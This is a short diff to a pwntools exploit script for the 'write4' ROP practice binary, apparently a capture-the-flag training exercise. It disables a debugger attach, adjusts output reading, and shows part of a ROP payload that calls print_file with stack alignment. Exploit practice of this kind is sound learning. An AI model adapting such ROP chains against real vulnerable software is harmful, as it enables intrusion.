@@ -5,7 +5,7 @@ context.terminal = ["wezterm", "start", "--"]
 
 bin = "./write4"
 p = process(bin)
-gdb.attach(p, api=True)
+# gdb.attach(p, api=True)
 e = ELF(bin)
 rop = ROP(e)
 
@@ -50,4 +50,5 @@ payload += p64(ret_addr)  # Stack alignment
 payload += p64(print_file_plt)
 
 p.sendafter(b"> ", payload)
-p.recvall()
+p.recvline()
+p.recvline()
